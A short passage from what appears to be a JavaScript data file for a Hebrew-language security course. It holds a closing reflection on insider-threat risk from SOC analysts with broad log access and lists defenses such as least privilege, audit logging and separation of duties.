          },
          {
            title: "מחשבה אחרונה: Who Watches the Watchmen?",
            icon: "👁️",
            content: "ל-SOC analyst יש גישה ל-logs של כל הארגון. הוא רואה מי גולש לאן, מי מתחבר ממה, מי שולח מה. מה מונע ממנו לנצל את הגישה הזו? Insider Threat היא אחת הבעיות הכי קשות באבטחה. הפתרון: Least Privilege גם ל-SOC, audit logs על ה-audit logs, separation of duties, ו-background checks. אבל בסוף — חייבים לסמוך על מישהו."
          }
        ]
      }
    ]
  }
];
